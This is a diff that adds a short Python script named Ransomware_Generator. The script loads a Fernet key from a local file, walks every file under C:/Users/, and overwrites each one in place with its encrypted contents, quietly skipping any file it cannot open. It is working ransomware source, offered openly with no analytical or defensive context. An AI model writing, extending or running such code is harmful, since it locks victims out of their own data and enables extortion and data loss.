@@ -1,0 +1,36 @@
+import os
+from cryptography.fernet import Fernet
+
+class Ransomware_Generator():
+    
+    @staticmethod
+    def load_key():
+        return open("key.key", "rb").read()
+    
+    @staticmethod
+    def encrypt(file_name, key):
+        k = Fernet(key)
+        
+        with open(file_name, "rb") as encrypt_file:
+            file_data = encrypt_file.read()
+            encrypt_data = k.encrypt(file_data)
+            
+        with open(file_name, "wb") as Encrypt_File:
+            Encrypt_File.write(encrypt_data)
+            
+
+folder_path = "C:/Users/"
+file_names = []
+
+for root, dirs, files in os.walk(folder_path):
+    for file_name in files:
+        file_names.append(os.path.join(root, file_name))
+
+RWG = Ransomware_Generator()
+key = Ransomware_Generator.load_key()
+
+for file_name in file_names:
+    try:
+        RWG.encrypt(file_name, key)
+    except (PermissionError, FileNotFoundError, ValueError, FileExistsError):
+        continue
